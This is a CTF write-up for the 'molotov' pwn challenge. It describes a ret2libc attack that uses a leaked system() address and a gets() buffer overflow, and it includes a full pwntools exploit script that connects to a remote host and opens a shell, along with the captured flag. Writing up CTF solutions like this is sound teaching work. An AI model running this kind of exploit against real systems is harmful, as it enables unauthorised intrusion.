# Welcome Pwner

Chuck it in ghidra or your favourite decompiler/analyser - we see it prints the system address to us, then uses gets to read an input. This is a classic buffer overflow which we'll attack with ret2libc.

As it prints the libc address of system, we can simply use that to calculate the libc base. The binary is 32-bit, and it reads input into ebp-0x1c, giving 32 bytes of padding until return address overwrite. Then, we just send system + junk + /bin/sh address

Note that we don't know the remote libc - I used libc-database find to get the remote libc binary, which is `libc6_2.30-0ubuntu2_i386`

So:
1. Receive libc address
2. Calculate libc base
3. Build ret2libc system("/bin/sh") chain
4. Pop shell, cat flag.txt

```python
from pwn import *
NUM_TO_RET = 0x1c + 4
padding = b'A'*NUM_TO_RET
e = ELF("./molotov")
p = e.process() if args.LOCAL else remote('54.210.217.206',1240)
libc = e.libc if args.LOCAL else ELF("/home/kali/Tools/libc-database/libs/libc6_2.30-0ubuntu2_i386/libc.so.6")
system = int(p.recvline(),16)
p.recvline()
libcbase = system - libc.symbols['system']
log.info(f"System address: {hex(system)}")
log.info(f"Libc base: {hex(libcbase)}")
libc.address = libcbase
chain = flat(libc.symbols['system'],libc.symbols['exit'],next(libc.search(b"/bin/sh\x00")))
p.sendline(padding + chain)
p.interactive()
```
#### Flag: FwordCTF{good_j0b_pwn3r}
